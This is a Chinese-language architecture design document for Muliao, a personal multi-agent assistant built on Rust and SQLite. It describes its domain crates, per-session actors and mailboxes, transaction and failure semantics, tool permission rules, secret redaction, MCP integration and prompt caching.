# Muliao 架构

个人多 agent 助手。后端 Rust（tokio + axum，LLM 层用 agenter：liewhite/agenter），代码在 `server/`；前端 React PWA（`web/`，可添加到 iOS 主屏、收 Web Push）。单机部署，SQLite（rusqlite）+ 文件目录。只给用户个人用：牺牲一点边角保证换大幅简化是值得的。

## 1. 领域概念

| 概念 | 含义 | 事实存放处（唯一来源） |
|---|---|---|
| Agent | 一个助手。以系统生成、不可变的 12 位十六进制 `id` 标识（主键、目录名、URL、工具参数都用它）；`name` 只用于展示，可改、唯一、能当目录名，不能取 `user`（指派 issue 时它指用户）。可分组、归档（归档的不能运行），最多一个默认 agent | 身份（id、名字、默认、归档、删除标记）在 `agents` 表；描述、模型、思考档位、分组只在 `assets/<名>/agent.toml`；分发规则在 `assets/platform/access.toml`；工作目录 `data/workspaces/<id>/` |
| Session | 某个 agent 的一段对话，由某个触发源创建；顶层会话或委派开出的 thread（带父会话与 thread 名）。消息是 agenter 的 `Message` 原样序列化；压缩（Compaction）是早期消息的摘要，之后的上下文用它代替被摘要的部分 | `sessions`、`messages`（每行一条）、`message_texts`（搜索用）、`compactions` 表 |
| Mail | 投进会话信箱的一封信：用户消息、挂起调用的回答、触发器与委派的任务、事件、运行中检查。按到达排序，记发送方、用户是否在等、所属委派、交给了哪次运行 | `mail` 表 |
| Run | 会话 actor 的一次运行或一次手动压缩：开始时写下，结束时记结局（完成、停止、最终失败及错误）。没结束的就是停在半路，重启后接着跑；信件交给了哪次运行、消息由哪次运行保存都指向它 | `runs` 表 |
| Hold（占用） | 别的工作替某会话在外面做的一项异步工作（后台任务、到点唤醒、委派）。委派还没结清就是发起方这条占用还 active | `session_holds` 表 |
| Job | agent 在后台跑的一条 shell 命令及其状态、退出码，永久保留 | `jobs` 表；输出在工作目录 `jobs/<id>.log` |
| Skill / MCP server / Secret | 资源：skill 是一个目录（`SKILL.md`，frontmatter 含 description，加任意附件）；MCP 连接配置（JSON，可引用 vault）；加密的密码 / token（按 key 引用）。名字 / key 各自全局唯一，按规则分发 | `assets/<owner>/` 下的 `skills/<名>/`、`mcp/<名>.json`、`secrets/<KEY>.toml`（Fernet 密文，主密钥在配置里） |
| Memory | 资源：有长度上限的 markdown。全局记忆（base 固定收录）、共享记忆（角色分给一组 agent）、私有记忆（按所属 agent 认，不占名字，规则不按名字指它）。agent 的知识只有记忆与 skill 两种 | `assets/platform/memory/<名>.md`；私有的 `assets/<agent 名>/memory.md` |
| File | 对话里的文件（用户附件、`share_file` 发出的、工具交回的图片）。写入后不可变，按 id 引用；与消息独立，删会话不删文件 | `files` 表；内容按 sha256 存 `data/files/`，相同内容只存一份 |
| Notification | 发给用户的一条通知（标题、正文、指向的会话或 issue、未读）。未读数即角标；Web Push 只是投递方式，内容不另存 | `notifications`、`push_subscriptions` 表 |
| History / ModelUsage | 工作历史：agent 做过的一件事（日期、标题、摘要、引用、重要程度），只追加，库触发器拒绝改删；用量：一次模型请求的 token 用量，是账目，只增不改。都不随 agent 与会话删除 | `agent_history` 表 + FTS5 虚表；`model_usage` 表 |
| Issue | 人与 agent 协作的一件事：状态、优先级、owner（必填、不随指派变）、指派人、上游依赖（无环）、时间线。in_progress 且上游已完成时，动态投进被指派 agent 在这个 issue 上唯一的会话 | `issues`、`issue_activities`、`issue_dependencies` 表 |
| Trigger | 具名、持久的事件来源，把外部刺激变成信件；定时、一次性、流式多态实现，每次触发新开一个会话；不会再触发的标为已结束，留下历史 | `triggers` 表 |

**资源目录（#498）**：可编辑的 AI 资源（记忆、skill、MCP、secret、agent 配置、分发规则）都是 `assets/` 下的普通文件（`platform/` 放 access.toml 与公共资源，`<agent 名>/` 放 agent.toml、memory.md 与它名下的资源），人和 agent 直接用文件工具改，下次读到就生效；没有版本，误改从备份或会话记录恢复。读走整树的不可变快照，按文件指纹（路径、修改时间、大小）缓存；平台自己写时串行读-改-写、原子 rename，toml 在原文上改（toml_edit）、保留注释。文件格式沿用 Python 版。原则：
- **文件在谁的目录下就归谁**：没有 owner 字段，转移 owner 就是挪文件。
- **名字只认数据库**：agent 目录按 agent.toml 里的 id 对上 `agents` 表，目录名必须等于库里的名字；改名只走平台（一把锁里挪目录、改 access.toml 那一节、写库，失败回滚）。id 不认识、重复、目录名对不上的整个不加载并报出，不猜是不是改了名。
- **坏文件跳过并报出**：读不出、格式不对的不加载，记成问题，在相关 agent 每次运行开头告诉它（platform/ 的只报给 admin），全部记日志；读坏的名字仍算占用，新建同名报 Conflict。
- **同名冲突时平台那份优先**：一份在 platform/ 的只加载平台那份，agent 目录那份报给它自己（#502：复制一份公共资源只坏自己那份）；全在 agent 目录的全部不加载（地位相同，不猜谁优先）。
- **access.toml 不合法整份作废、沿用上一份**：跳过写坏的一条（尤其 deny）等于放宽权限（#573），整份失效又会谁都没有 admin、没人能改回（#550），所以沿用本进程上一份快照，此时平台自己改它一律 Conflict「先修好它」。只引用不存在的东西只会收窄，记问题、照常。
- **agent 配置只认文件（#549）**：一次运行在确认有事交给模型时取一份配置，和工具权限一起定下，整次运行不变（#571）；配置读坏或模型不能运行时当场失败，不沿用旧值。

## 2. 领域与边界

### 2.1 领域

Cargo workspace，一个领域一个 crate（`server/crates/<领域>`，包名 `muliao-<领域>`），成员按目录收：

```
  platform/        配置、数据库、路径身份（fs）、vault、起命令与写沙箱（shell、sandbox）、SSE 展示总线（bus）、
                   工具的共同契约（tooling、tool_views）、出站 HTTP 客户端（net）、日志
  assets/          资源目录与快照、agent（agents 表、建/改名/归档/删除）、分发规则与角色、记忆、skill、MCP、secret
  runtime/         会话运行的端口：模型、指令组装、工具箱、MCP 连接、附件的两种形态、逐步驱动 agenter
  sessions/        会话 actor、信箱、历史、运行记录、挂起的调用、占用与结清、委派与 thread、到点唤醒、压缩、停止、删除
  workspace/       文件工具、run_shell 与后台任务、skill_run 与「始终允许」、以 agent 身份起命令、工作目录浏览与 agent 页面
  files/ usage/ notifications/ issues/ triggers/ history/ web/ speech/（后两个配置了才有）
  http/            HTTP 适配（接口、SSE、登录、OpenAPI、前端静态文件）
  muliao/          组合根（src/lib.rs，只装配，无业务规则）与二进制 `muliao`
```

每个领域独占自己的表（各表有唯一读写的模块，模块注释写明「`xxx` 表的唯一读写处」），迁移是自己 crate 里的一串 SQL；领域之间只用不透明的 id 相互引用，没有跨领域外键。`runtime` 不是业务领域，是会话运行的端口：把 agenter 的逐步运行收在「给历史，返回下一步」后面（`Run::step`），每一步的产物交给会话领域保存，它自己除了用量账目不存库。具体工具各在所属领域，它只按规则组合组合根交来的工具集；工具一律通过领域接口做事，不碰别的领域的表。

### 2.2 领域之间怎么通信

本机单进程、同一个 SQLite 文件：跨领域的写入放进同一个事务就是原子的，不需要 outbox、投递队列与幂等去重。只有三种：
- **调用**：调对方公开的函数。要和自己的写入一起成败的，把当前事务 `&mut Tx` 传过去（`*_in` 函数，如来信 `SenderInbox::receive_in`、后台任务的占用与结局 `SessionWork::hold_in` / `ended_in`、发通知 `Notifications::notify_in`），一次操作涉及几个领域的写入由发起方的一个事务包住；否则对方自己开事务。对方要在提交之后做的事（叫醒会话 actor、推送、逐层停止 thread、杀进程）由它用 `Tx::on_commit` 排到提交之后，调用方不管。
- **事件**：发布方宣布自己发生了什么、不该知道谁在听（或一对多）时用，在发布方的事务里同步调用每个订阅者（第 3.3 节）。发起方知道要谁做什么的，用调用，不用事件。
- **查询**：只读，返回对方定义的读模型（`*_in(&Connection, …)` 或门面方法），不是对方的表。

**跨领域的检查与写入放在同一个事务里**，之间插不进别的变化。分在两个事务的（检查之后要先做事务外的事，如删除 agent 前算资源目录的改动），写入事务里再查一次。

**一致性的三个级别**：
- **强一致**：一个事务，可以跨领域（运行收尾里结清委派、写通知、issue 请它表态；删除 agent 时各领域的清理）。
- **最终一致**：提交之后才做的事（推送、逐层停止 thread、删除 agent 的文件）：失败记 error 日志，重试只在内存里或在下次启动时接着做；每处的判据见第 18 节。
- **对账**：数据库与外部资源（资源目录、文件存储、进程、Web Push、模型接口）之间，失败可见 + 启动时对账（文件存储清临时文件、收掉上次没收尾的后台任务、接着删没删完的 agent、续跑停在半路的会话）。

### 2.3 依赖规则

前两条由 Cargo 与 `server/crates/muliao/tests/layers.rs` 检查，其余是约定与装配时的约束：
- 领域之间只用对方 `pub` 的函数与类型，不写对方表的 SQL。
- **依赖按层单向**，只能依赖更早一层的 crate：0 `platform` → 1 `assets`、`files`、`usage`、`web`、`speech` → 2 `runtime` → 3 `sessions` → 4 `workspace`、`notifications`、`issues` → 5 `triggers` → 6 `history`（活动概览要读会话与 issue）→ 7 `http` → 8 组合根。Cargo 只拦循环依赖，同层、反向由 `layers.rs` 查（测试用的 dev 依赖不算）；新领域先在它的 `LAYERS` 里定层，没定层的也报错。反向或同层需要的调用由组合根注入函数（如 issue 发通知的 `NotifyIn` 接到通知领域的 `notify_in`）。
- `platform` 不认识领域的词汇（会话、issue、agent 这些词都不出现在里面）；领域不依赖 HTTP 层与组合根；HTTP 层只经各领域给界面的门面（`muliao_http::Services`），业务规则都在领域里，HTTP 层与组合根不另写一份。
- 工具的错误一律经 `platform::tooling` 的统一映射交还模型（第 6 节）；agenter 的 `Agent` 只在 `runtime` 构造，会话领域按它的 `Step` 驱动、存它的 `Message`（历史的存储形态），各领域的工具实现它的 `Tool` 接口；路径身份（「是不是同一个路径、在不在某目录下」）只在 `platform::fs::real` 算（#570：APFS 不分大小写与正规化形式），「在不在某目录下」与写沙箱只收它给的 `RealPath`。
- 写事务经 `platform::db::Database::write`：同步闭包，在单写者线程上执行，里面不能 await（第 3.1 节）。
- agent 的命令只经 `platform::shell` 起；以哪个 agent 的身份（secret、工作目录、可写路径）由工作区领域拼好交进来（第 9 节）。
- 数据库层级联只在会话领域内部（没有跨领域外键）。
- **组合根只装配**：`muliao/src/lib.rs` 的 `assemble` 按层建好各领域的服务，把各领域给出的部件（工具集、事件订阅、删除钩子与归档检查、来源说明、常驻循环）交给需要它们的一方；`App::start` 在对外服务之前做必须先做的事，`App::shutdown` 在 HTTP 排空后停常驻的东西。
- **漏装配不静默**：事件订阅没登记就发布当场 panic；工具重名、声明要脱敏的参数不在工具参数里，建工具箱时报错（测试守住）。
- **组合根没有构造环**：会话领域先给出叫醒句柄 `Waker` 与停止句柄 `Stopper`（别的领域与工具要用），actor 系统最后起来再 `bind`；资源快照要的工具表先建、工具箱装好后 `bind`。

## 3. 平台
### 3.1 数据库
SQLite 单写者：所有写事务在一个专用线程上串行执行（`Database::write`），换来无丢失更新、无 `SQLITE_BUSY`。事务是同步闭包，里面不能 await，所以「事务里不做模型调用、网络请求这类慢事」由编译器保证；调用方被取消（停止、关停）时事务照样在写线程上做完或回滚，不会被打断一半。读走只读连接（WAL 下与写并行，`Database::read`），一次 read 的闭包包在一个读事务里，里面的多条查询看同一个快照（#766；读事务占着快照会拖住 checkpoint，闭包里别做慢事）。写过表的事务提交后调 `after_write`（组合根据此推 SSE `changed`）；事务里登记的 `Tx::on_commit` 在提交后按登记顺序执行，回滚时丢弃。时间一律存 UTC。

### 3.2 会话 actor：没有任务队列
没有通用任务队列（#675 删掉了 Python 版的 `tasks` 表、按 lane 排队的 worker 与「任务」页）。会跑很久、会暂时失败的工作只有三种：会话的运行、手动压缩、推送；前两种归会话 actor，推送归通知领域（第 14 节）。

- **每个会话一个 actor**（`sessions/src/actor.rs`）：一个 tokio 任务，收四种命令——叫醒、停止、手动压缩、重试最终失败的运行，一次只跑一个运行；没事可做时退出，下一条命令再起一个。
- **要不要跑只看库**（`should_run`，唯一规则）：信箱里有排着的信，且不是「这些信都已交给过最近一次最终失败的运行」，也不是「停在挂起的调用上、还不能继续」。所以投信只需提交后叫醒（`Waker::wake_on_commit`），叫醒丢了、多叫几次都没关系；工作状态的 running（第 7 节）与删除规则也用同一条。
- **重启**：服务启动时、对外服务之前（`Actors::resume`），有没结束的运行（停在半路）或有排着的信的会话各叫醒一次，按上面的规则接着跑；停在半路的手动压缩记为失败。信、历史与运行记录本来就在库里，没有要恢复的队列状态。
- **并发：运行不设上限，在稀缺资源处限流**：会话各自并发，运行只是协程，不是稀缺资源。稀缺的是模型调用：每个 provider 一个并发上限（`max_concurrency`，所有模型与 agent 共用），在 `ModelRegistry` 构造模型时套上（agenter 的 `Limit`），流式请求整个流期间占一个；运行只在真正请求模型时排队，跑工具、等后台任务不占配额。机器算力交给操作系统。
- **失败**：暂时性的（模型或外部服务一时不可用：agenter 的 `RunError::is_transient`，含工具报的 `ToolError::Unavailable`）在 actor 里退避重试（5 秒起翻倍、最长 5 分钟一次），从同一个运行接着跑；从第一次失败起约 30 分钟（实际出现过中转站与跨境 HTTPS 断十几到三十分钟）还不行算最终失败，期间存下了新消息就重新计时。其余失败（含运行 panic）当场最终失败。重试只在内存里：退避期间重启，启动时按「没结束的运行」接着跑。最终失败记在运行记录上（会话页显示错误与「重试」按钮，同时推送通知），在同一事务里结清交给它的委派、发布 `RunFailed`；手动重试把它重新算作没结束，同一个运行接着跑。
- **保留**：运行记录与信件永久保留（信件引用运行）。

### 3.3 领域事件
`sessions/src/events.rs`：会话领域是唯一发布事件的领域，事件是 `RunEnded`、`RunFailed`、`SessionStopped`、`SessionDeleted`；订阅方（通知、issue、工作区）在组合根装配时一次登记。发布方在自己的事务里发布，按登记顺序逐个调用订阅者，订阅者的写入与发布方一起提交或回滚，出错交给发布方：例如 `RunEnded` 的订阅者出 bug，一次其实做完了的运行会按运行失败处理，委派方收到「失败」；`RunFailed` 的收尾出错时只记下失败、不带收尾：委派不结清、之后到的信也没被唤醒，等它的发起方一直挂着（运行中检查如实告诉发起方，让它 `stop_thread`），或用户停止（失败本身在会话页与日志里可见；#661 删了补做的信箱对账）。代价：一个订阅者的 bug 会让发布方的操作一起失败，而不是只有那条反应失败；Python 版改动前（#648）近 30 天 8547 次投递失败 0 次，所以不为隔离付一套队列。规则：
- 订阅者只做短的数据库操作；事务外的事（杀进程、推送）用 `Tx::on_commit` 排到提交之后。
- 发布放在发布方状态改完之后（例如运行收尾先结清、唤醒，最后发 `RunEnded`），订阅者看到的是最终状态。
- 订阅者是同一个事务里的直接调用，所以不需要幂等键、顺序保证、「事件迟到时会话已删」之类的容错。
- 删除 agent 的各领域清理不是事件，是 `assets` 的 `AgentLifecycle` 按组合根登记的删除钩子（`DeletionHook`）逐个调用（第 10 节）。

### 3.4 实时展示总线
`platform::bus::Bus` 与 SSE 只是展示加速，不是领域事件：不持久化、不保证送达，数据库是唯一事实源；订阅者跟不上时直接结束它的订阅，前端重连后重新拉取。命名区分领域事件（domain event）与 SSE 推送（server event）。关停时先关总线，让 SSE 响应正常结束，其余请求最多再等 3 秒（#330）。

## 4. 并发模型
tokio 多线程运行时。**取消 = 丢掉 future**：Rust 里丢掉一个 future 就是在它下一个 await 点取消，没有「取消消息被工具吞掉」「取消后每次 await 再抛」这类问题，也不需要屏蔽取消的作用域。仍要注意的只有两处：
- **数据库事务不会被打断**：事务在写线程上执行，调用方被丢掉时事务照样做完或回滚（第 3.1 节）。
- **起了就必须做完的事放进独立的 tokio 任务**：例如后台任务的启动（起进程、写任务行并登记占用、交给照看者）在 `tokio::spawn` 里一气做完，发起它的运行被停止也不会留下没人管的进程或任务行；被丢掉时要杀的子进程（前台 shell、MCP stdio server）由各自的句柄在 drop 时杀掉整个进程组。

**异常的边界**：① 每个运行包在 `catch_unwind` 里，panic 按契约外的失败记为最终失败，不影响别的会话；② 常驻循环（叫醒分发、到点唤醒与运行中检查的节拍、触发器扫描、流式托管、后台任务照看者）每一轮的错误记 error 日志后继续，由下一轮或启动时对账收敛，不穿出去。

## 5. 核心数据流：一切都是信
所有触发源只做一件事：**创建或选中 session，往它的信箱投一封信**（`sessions/src/inbound.rs` → `mailbox::post_in`），提交后叫醒会话 actor。之后的执行、重试、续跑全由 actor 驱动，没有例外（`ask_agent` 也只是往 thread 信箱投信，发问方挂起等回信）。我们在 agenter 消息上加的约定（metadata 的键、停止标记、事后补的结果）按谁写下集中登记在 `sessions/src/conventions.rs` / `runtime/src/conventions.rs`，解析也只写在那里。

```
Web / 触发器 / delegate_task / ask_agent        后台任务与委派的结局、运行中检查
          └──────── mail（会话信箱）◄────────────────┘   提交后叫醒
会话 actor ─► run::execute ─► Run::step（agenter 逐步驱动）
      每一步一个事务：请求模型前存这次请求及它带上的信件；模型回复后存回复
      收尾一个事务：记运行结局、结清委派并交回结局、发布 RunEnded；信箱还有信就接着跑
```

- **删除约束**：会话或 agent 忙（有没结束的运行或要处理的信，或有 active 的后台任务、委派、唤醒）时拒绝删除（409），避免结果无处提交、工具写进被删目录；挂起的提问不挡删除。界面上停止与删除是两步。
- **实时展示**：每一步保存后历史里就有了，所以内存只留当前这一段（一次请求之后的回复与工具调用）的事件，带段 id 与递增 seq（`sessions/src/live.rs`）；前端按段合并快照与 SSE，发现缺口就重拉。工具步骤显示的起止时间只用真实记录的（拿不到就不显示、不推算）。

### 用最终正确性换架构简化
换掉的：「每个触发点、每次模型调用、每次推送都必须当场成功」。换来的：运行靠「库里的信与历史 + 每步保存 + 启动续跑」，推送靠内存里的退避重试，没有各自的补偿逻辑，也没有通用任务队列。领域之间的反应不在此列：它们是同一个事务里的直接调用或同步事件（第 2.2 节）。三条判据：

1. **失败可见**：运行最终失败记在运行记录上、打 error 日志、推送通知，会话页显示错误并可重试；重试期间会话页显示「在重试」与上次错误。推送最终失败只记 error 日志，由错误监控发现。
2. **可收敛**：契约内的失败（模型接口的暂时性状态码与流中途错误、网络错误、超时、推送 5xx/429）退避重试。actor 只认 agenter 的暂时性判断，不认识任何 SDK：模型的错误由 agenter 分类，工具在自己的边界把外部服务一时不可用换成 `ToolError::Unavailable`。运行**每一步保存**，所以重试、重启都从上一步续跑：停在没得到回复的请求上就重发，停在带工具调用的回复上就给没结果的调用补「被中断、没有重新执行」再重发；已保存的步骤不重放、不产生重复消息。契约外的失败（bug、模型 400、解码失败、配置错误、存下的消息与代码不一致）不重试，直接最终失败；单个定时触发器数据不合法只停用它并记 `disabled_reason`。
3. **代价可控**：**被中断的工具不重放**——它的副作用是否已发生无从知道，交给拿到「被中断」结果的模型判断。所以重复副作用只来自一步之内的并行调用（已做完、结果没保存的整步补结果，模型可能重做；按次计费的 web 工具会再付一次）。运行不设请求数上限（开发任务一轮上百步是常态），也不设总时长。推送每台设备独立重试、只重试失败的那台，只有 404/410 才删订阅；退避期间重启，那条推送就不发了（通知本身与未读角标都还在）。领域间反应晚几百毫秒。

### 停止会话
用户在会话非 idle 时可停止（排队中、等后台任务或委派的会话也停得了）。停止是发给会话 actor 的一条命令，同步返回（#272）：返回时停止事务已提交，所以调用方随后投的信（如 `issue_stop` 的收尾消息）不会被清掉。做法同 ChatGPT、Claude Code：停止前已产生的部分照常保存——工具副作用已经发生，模型必须知道做过什么，否则会重复执行。停止与运行都在同一个 actor 里，没有「运行已领取但还没登记可停止」的竞态。

- **保存已产生的部分**：在跑时 actor 丢掉这次运行（即取消），先等写线程上排在前面的事务做完（被丢掉的运行如果正等着保存一步，那一步先提交），再从共享的 `Partial` 取出还没保存的部分（生成到一半的回复、做完的工具结果）交给停止事务；生成到一半的回答标 `interrupted` 保存。被打断的思考块没有签名，库里保留，但发给 Anthropic 时不带（agenter 处理，实测带着会整次拒答）。重试的退避期间也能停止。
- **停止事务**（`sessions/src/halt.rs`，一个事务）：给悬空工具调用补「被停止」结果（等用户回答的提问留着，仍可回答），末尾标 `RUN_STOPPED`；没结束的运行记为停止；全部 active 占用记为 cleared，之后到的结局不投（否则刚清空的信箱又被唤醒）；委派来的工作结清为「被停止」交回发起方，信箱里未交给模型的信件记为丢弃（不删）；发布 `SessionStopped`（工作区在提交后结束被清掉的后台任务）；被清掉的委派对应的 thread 在提交后各自停下（逐层，由它们自己的停止继续）。服务恰好在提交与停 thread 之间重启时那些 thread 不会被停，跑完的结局因占用已清掉而不投（罕见、只多花一段 token，不为它持久化停止任务）。
- 被停止的运行不推送。

## 6. Agent 运行时

一次运行由 `sessions/src/run.rs` 驱动，`runtime/src/runner.rs` 组装上下文与工具（`Runtime::start` 得到一个 `Run`：工具组、MCP 连接与这次的 `RunScope` 都跟着它，丢掉它就断开 MCP）。**给模型看名称，给程序用 id。** 工具参数、返回值、instructions 里只出现 agent 名称（唯一），由工具层解析为 id，写错时把可用名称交还模型；id 只作为文件路径的一部分出现。

- **instructions**（`runtime/src/instructions.rs`，渲染成提供方的 system）= 运行上下文之外的固定说明（agent 名、工作目录、会话来源的说明——来源说明由各领域给出、组合根合成 `OriginNotes`，运行时不认识来源）+ 能用的每块记忆全文（标出名字、能否改、文件位置）+ skill 索引 + 自我进化守则。**只放同一会话不同运行之间不变的内容**：缓存断点在它末尾，DeepSeek 等自动前缀缓存也从这里开始匹配，里面有一个每次运行都变的值，整段历史每次都要重写缓存。
- **运行上下文**：必须随运行变化的几行——当前时间、「回答交给谁」、这次运行连接工具时发现的问题（如不可用的 MCP server）。它作为单独一段文字挂在**这次运行新增的第一条请求**上（metadata `RUN_CONTEXT` 记下标），随消息入库、之后原样重放：旧消息字节不变，缓存才命中。从历史续跑重发已保存请求的那一步不挂（改已保存的消息等于作废之前的缓存），留给下一条新请求；运行中途压缩把挂它的请求压进摘要时，下一条新请求重新挂一段。会话页不展示它，它不是用户说的话。
- **工具与分发**：每个领域在自己的 `tools.rs` 声明工具集，组合根交给 `Toolbox`（`runtime/src/toolbox.rs`）。内置工具只能经 `platform::tooling::builtin` 带着声明交出：读/写、是否管理类、要脱敏的参数、界面展示、是否排队执行，加工具只改它自己的定义；工具箱收集成分发用的工具表（交给资源目录的 `ToolTable::bind`）、界面展示规则与落库前的脱敏。开放哪些工具、资产由**分发规则**决定，目的是防误操作、省上下文，不是安全隔离。规则是 `action:kind:glob`（action 为 `use`/`write`/`*`，kind 为 tool/skill/mcp/secret/memory，整串 fnmatch；另有 `write:path:<目录>` 放开本机写，见第 15 节「写沙箱」），allow/deny 两组、deny 优先，判断只有 `Rules::allows` 一处（`assets/src/rules.rs`）。
- **角色**：内置只有 `base`（每个 agent 隐含：全部非管理工具 + 全局记忆 + access.toml 里可编辑的人人可用资产；固定部分从工具表算出、写成纯 allow，新工具自动归入）和 `admin`（`use:tool:*` + `write:*`）。「是不是 admin」只看规则是否放行不限种类的写（`Rules::allows_every`），代码里没有 admin 特判。多对多关系（服务器、交易账户）就是一个角色收录 skill + secret 再分给几个 agent。最终规则 = base + 各角色 + 自己的 allow/deny（并集）。改 access.toml 的校验只有 `access_file::vet` 一处（界面、平台、文件工具共用）：新加的规则至少匹配一个现有工具或资源，已有的不查（资源删了再建分发不丢）；写坏的文件整份作废、沿用上一份。
- **工具列表只由规则配置决定，不随运行状态变**：工具定义在缓存前缀最前面，列表一变整个前缀失效。所以不按运行状态隐藏工具，依赖运行状态的前提（如 `ask_user` 要有用户在等）在调用时检查，不满足返回领域错误交还模型。界面、`get_agent` 与运行时用同一套计算得出工具与资产。
- **工具的共同约定**：局部修改（`trigger_update`、`issue_update`）由领域服务在一个事务里只改给出的字段，并行修改与用户同时编辑互不覆盖。输入输出用模型熟悉的标准格式并在说明里写明（#249）：带行号内容一律 `cat -n`，行号从 1 起；多段读取沿用 `head` 的 `==> path <==` 标题；截断与续读提示是单独一行方括号说明；结构化结果序列化成**一段** JSON；写操作确认是「动词过去式 + 对象 + 名字」。工具参数是 `Deserialize + JsonSchema` 的结构体，Schema 从类型生成，字段上的 `///` 就是参数说明。
- **工具错误的统一映射**（`platform/src/tooling.rs`，各领域都照它）：调用方改了输入就能成的（`DomainError`：参数不对、找不到、冲突）→ `ToolError::Retry`，交还模型修正；同一工具连续「请重试」的次数从历史里数（agenter 的 `MAX_RETRIES`，用户新说话就重新数），超了按失败交回并提示换做法，不终止整轮。外部服务暂时不可用（连不上、超时、429、5xx）→ `ToolError::Unavailable`，整次运行按暂时性失败稍后重试。其余（配置或账户问题、程序错误、系统自己的数据坏了）→ `ToolError::Abort`，整次运行失败、让人看见。挂起的调用返回 `ToolError::Defer`（第 7 节）。参数解析失败的「请重试」只说哪个字段、什么问题，不带模型给的值（值里可能有密钥）。MCP server 回 `isError` 或拒绝请求同样按「请重试」交回。
- **文件工具**（`read_file` / `write_file` / `edit_file` / `share_file`，`workspace/src/file_tools.rs`）：`read_file` 的 `reads` 一次读多段，输出到上限时在整行处停下并写明从哪接着读（#181）；读图片交回图片内容（走附件同一通道）。`edit_file` 两种定位：`old_text` 原文，或 `start_line`/`end_line` + `anchor`（首行原文，对不上就报错，防行号过期改错，#180）；`edits` 一次改多处、可跨文件，行号一律指调用前的原文（#218），任何一处失败所有文件都不写，成功时回显改动处省掉回读。行的切分同 Python 的 `str.splitlines`（read_file 与 edit_file 必须是同一种分法）。四个文件工具声明 `sequential`（agenter 里是屏障：同一回复里排在前面的调用做完它才执行、它做完才执行后面的）：模型常在同一回复里先 `run_shell` 生成文件再读或发送，并行会 file not found（#224）；不夹着文件工具时其余调用照旧并行。不做搜索工具，靠 shell 里的 `rg`。
- **资源文件写入**：记忆与 skill 没有专门工具（#498），是资源目录里的普通文件。平台写资源目录都在 `AssetSource` 的同一把锁里（与读树串行）：改写一个文件的全文（界面编辑记忆、SKILL.md、MCP，`write_file`/`edit_file`）经写入口 `AssetSource::write`（#500、#578），按读树的同一套规则校验写成后的全文（`assets/src/asset_files.rs`），不合格整次不写并说明原因；其余写入（`vault_set` 加密、导入 skill 目录、建 / 改名 / 删 agent、改 access.toml、删除与转移 owner）在 `AssetSource::writing` 里做，规则在各自的模块（agent.toml 在 `formats::agent_file`，access.toml 在 `access_file::vet`）。用 shell 写的不经过平台，下次读树报出。**防并发覆盖**：`write_file` 覆盖资源目录里已有的文件，要求本次运行 `read_file` 读过且之后没被改，否则拒绝。
- **委派与阻塞语义**（#217、#307）：阻塞的调用（前台 `run_shell` 必填 `timeout`、`ask_agent` 无 timeout——agent 的运行本身有界）；非阻塞的（`delegate_task(report_back)`、`run_shell(background)`）没有 timeout，只有 `heartbeat_seconds`；参数用错场合以说明正确用法的错误交还模型。目标可以是自己（#183）：一次性、可并行的杂活给自己开新 thread，上下文不进发起会话（取代了临时 agent）。
- **secret**：`vault_set` 的值在落库、推送前与参数校验错误、失败信息里都替换掉（工具箱按声明的参数脱敏）；没有读明文的工具。`allow_shell = false`（#528）的 secret 只能经 `skill_run` 跑的 skill 脚本与 MCP 配置使用，agent 自己写的命令（run_shell、precheck、stream）注入被拒——只防误操作，敏感操作写成自带校验的 skill 脚本。以太坊签名等要逐次批准的操作是 skill 脚本 + `approval:`，不是内置工具（#536）。
- **web**：`web_search` / `web_fetch` 经可替换的 `WebProvider`（按配置 `[web].type` 选），没配置就不注册。输入限制以服务端为准不在本地重复。fetch 抓取服务在国内、境外站点常抓不到，所以服务失败时直连 GET 一次再提取正文（#189、#309），两边都失败把原因一起交还模型。
- **MCP**（`runtime/src/mcp.rs`，agenter 的客户端基于官方 rmcp）：每次运行按当时配置连接 agent 能用、已启用的 server，工具以 `<server>_` 为前缀，改动从下次运行生效；stdio server 在运行的工作目录里启动、关进使用者的写沙箱、自成进程组，断开时整组杀掉。**一个 server 出问题只影响它自己**：连不上或 secret 不可用就这次没有它的工具，原因作为运行上下文里的提示告诉模型；调用时出错（含超时、断开，一次调用最多等 5 分钟）只让这次调用失败交还模型。异常文本可能带代入后的 secret，一律脱敏后再进日志、错误与结果。
- **model**（`runtime/src/models.rs`）：`<provider>:<模型名>`，provider 在配置里定义，类型只认 agenter 支持的 `anthropic` 与 `openai-responses`；`ModelRegistry` 是唯一构造模型的地方。key 与 base_url 只来自配置，不读环境变量。出站请求走共用客户端（第 14 节）。界面的模型名实时向 provider 查询，不维护本地清单，查不到就报错不猜。**prompt caching**：anthropic 类型默认开启，断点三个：指令、工具定义、消息末尾（Anthropic 上限 4）。断点要起作用，前缀必须逐字节稳定：指令里不放随运行变化的值，已保存的消息不再修改。用逐块断点而不是服务端自动缓存，因为兼容网关不一定支持；`prompt_cache = false` 可关，填在别的类型上启动即报错。
- **思考档位**（#171）：agent 的 `thinking`（default/off/low…xhigh）交给 agenter 换算成各家参数，平台不做厂商映射。不按模型名查能力表：档位总是照发，模型不支持时由服务端报错，所以「这个模型能不能运行」平台只查得到 provider 配了没有、名字格式对不对。**思考的展示**（#603、#611）：Anthropic 发 `display: summarized`、OpenAI Responses 总是要摘要（agenter 做），会话页显示思考块正文（推理项同时有摘要和原始推理时 agenter 只留摘要）；只影响展示，不改存库与发回模型的内容。**发回去的思考**：没有签名的思考（生成中被停）和别家协议的思考，agenter 在两种协议里都不发（Claude 会把它当作套取推理整次拒答），库里不变。

## 7. 会话领域

职责：会话、thread 树、信箱、历史、挂起的调用、会话 actor 与运行（逐步保存）、压缩、停止、删除。会话 actor 是运行的串行边界，会话领域的一个本地事务是状态的一致性边界。对外接口：界面经 `SessionService` 门面，别的领域经各模块的 `*_in` 查询、`SenderInbox`（来信）与 `SessionWork`（外部工作），事件在 `sessions/src/events.rs`。

### 会话种类

- 只有两种：顶层会话（用户、触发器、issue 开出）与 thread（只由 `delegate_task`、`ask_agent` 开出，带父会话与 thread 名）。不另存种类（#581）：是不是 thread 只由来源定（来源编号的格式只在 `sessions/src/origins.rs`）。两种都列在会话列表、用户能写、能单独删除、最终失败时通知用户；回答交给谁不看种类，看这次运行处理的信件。thread 不记发送方身份，所以按发送方定位会话天然只找到顶层会话。会话列表把不空闲的会话置顶并标「运行中 / 等待中」；关键字搜索查的是写消息时同事务维护的可搜索文字索引（`message_texts`：用户消息、回复、工具调用参数），不含工具结果与 JSON 键名——直接 LIKE 消息 JSON 会让常见词命中几乎所有会话（#254）。
